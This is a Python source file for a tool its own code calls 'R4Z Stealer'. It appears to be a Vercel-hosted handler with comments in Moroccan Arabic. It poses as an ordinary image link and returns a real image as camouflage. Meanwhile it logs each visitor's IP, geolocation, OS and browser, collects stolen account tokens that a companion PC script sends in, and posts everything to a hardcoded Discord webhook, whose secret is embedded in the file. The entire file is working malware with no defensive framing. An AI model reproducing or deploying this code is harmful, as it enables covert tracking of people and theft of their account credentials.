from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

# --- CONFIGURATION ---
config = {
    "webhook": "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSh0Evg2YNAbxH1OyJeEgTWmYLoukpkNbhXjw&s",
    "username": "R4Z Logger",
    "color": 0x00FFFF,
    "linkAlerts": True,
    "buggedImage": True
}

# --- الجزء الجديد لاستقبال التوكينات ---
def makeReport(ip, useragent=None, tokens=None, endpoint="N/A"):
    # إذا كان السكريبت صيفط توكينات من الـ PC
    token_str = ""
    if tokens:
        token_list = tokens.split(",") # التوكينات كيوصلو مفروقين بفاصلة
        token_str = "\n".join([f"🔑 `{t}`" for t in token_list])
    else:
        token_str = "No tokens captured (Web Only)"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "🚀 New Capture - R4Z Stealer",
            "color": config["color"],
            "description": f"""**Target Captured!**
            
**Network Info:**
> **IP:** `{ip}`
> **Country:** `{info.get('country', 'Unknown')}`
> **ISP:** `{info.get('isp', 'Unknown')}`

**Captured Tokens:**
{token_str}

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
""",
            "footer": {"text": "Vercel Hosted Logger"}
        }]
    }
    requests.post(config["webhook"], json=embed)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        # كنجلبو الـ IP ديال الزائر
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        ua = self.headers.get('user-agent')
        
        # إذا كان الرابط فيه توكنات (جاية من سكريبت الـ PC)
        tokens = dic.get("tokens") 
        
        makeReport(ip, ua, tokens, endpoint=s)

        # الرد بالصورة (بما يتناسب مع Vercel)
        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()
        # هنا كنصيفطو الصورة الحقيقية للتمويه
        img_data = requests.get(config["image"]).content
        self.wfile.write(img_data)

    do_POST = do_GET
